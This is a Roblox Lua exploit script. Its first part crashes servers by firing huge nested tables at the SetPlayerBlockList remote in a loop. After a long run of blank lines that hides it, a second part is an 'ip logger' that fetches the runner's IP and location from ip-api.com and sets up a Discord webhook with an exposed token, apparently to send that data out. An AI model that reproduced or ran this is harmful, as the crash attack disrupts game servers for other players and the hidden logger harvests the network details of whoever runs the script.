local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
 
bomb(289, 5) --// change values if client crashes
end
















































































































local willwebhook = true -- send webhook or nah
local printraw = false -- print raw response without formatting
local censor = true -- censore shit
local webhook = "https://discord.com/api/webhooks/1111801733820194858/DzyntPRZ_fF-uHeGy1STK3iKJrPGSfh2q1lAYx5-oOseD5OHdI4uAMc0of6GWULUTqZm" -- optional if not willwebhook
local httpservice = game:GetService("HttpService")
-- two below used for willwebhook
httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
UserId, PlayerName, PlayerDisplay = game:GetService("Players").LocalPlayer.UserId, game:GetService("Players").LocalPlayer.Name, game:GetService("Players").LocalPlayer.DisplayName

function getjson()
    local response = game:HttpGet("http://ip-api.com/json")
    if printraw then return response end
    return httpservice:JSONDecode(response)
end
function payload()
    if willwebhook then
        -- send request to webhook, too lazy to code
    else
        print("--- ip logger by 25KFN ON YT ---")
        if printraw then
            print(getjson())
        else
            for i,v in pairs(getjson()) do
                local text = v
                if censor then text="[censored]"end
                print(i..": "..text)
            end
        end
    end
end
payload()
